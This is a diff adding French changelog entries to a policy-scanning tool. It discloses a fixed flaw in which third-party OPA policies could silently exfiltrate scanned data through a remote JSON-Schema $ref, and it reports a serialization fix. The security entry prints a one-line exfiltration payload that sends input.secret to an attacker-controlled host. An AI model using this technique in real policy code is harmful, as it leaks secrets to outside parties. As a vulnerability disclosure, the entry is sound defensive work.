@@ -22,6 +22,30 @@ l'une ni l'autre appartient au `git log`.
 
 ## [Non publié]
 
+### Sécurité
+
+- **Une politique tierce pouvait exfiltrer l'inventaire audité, en silence.** Les règles
+  chargées à chaud via `--policy-dir` sont du code tiers, exécuté sur tout ce que le
+  scan a collecté. Le moteur avait retiré `http.send`, `net.lookup_ip_addr` et
+  `opa.runtime` et annonçait le réseau hors de portée ; c'était faux. OPA résout le
+  `$ref` distant d'un JSON-Schema par HTTP **au moment de l'évaluation**, sur un chemin
+  qu'aucun builtin ne garde, et une ligne suffisait :
+  `json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attaquant, input.secret])})`.
+  Mesuré contre le scankit v0.2.2 épinglé, avec un serveur témoin : la requête partait,
+  et `Evaluate` ne rendait **aucune erreur** — le silence était la partie qui comptait.
+  scankit est désormais épinglé en v0.3.1, dont le jeu de capacités porte
+  `AllowNet: []string{}` (vide et non nul refuse tout hôte), et
+  `TestNoThirdPartyPolicyCanReachTheNetwork` tend un témoin contre lui pour qu'une
+  régression d'épinglage ne rouvre pas la brèche en silence.
+
+### Corrigé
+
+- **`evidence.proves` ne voyage plus en `["","",""]` sur chaque résultat.** `omitempty`
+  sur un tableau de taille fixe est sans effet, si bien qu'un lecteur ne pouvait pas
+  distinguer « aucune preuve enregistrée » de « trois preuves enregistrées, toutes
+  vides » — y compris dans un bundle scellé archivé pour plus tard. Corrigé en amont
+  dans scankit v0.3.1, et gardé ici, là où les dossiers sont publiés.
+
 ### Ajouté
 
 - **Un finding déclare désormais sa CONFIANCE, distincte de sa sévérité.** La sévérité
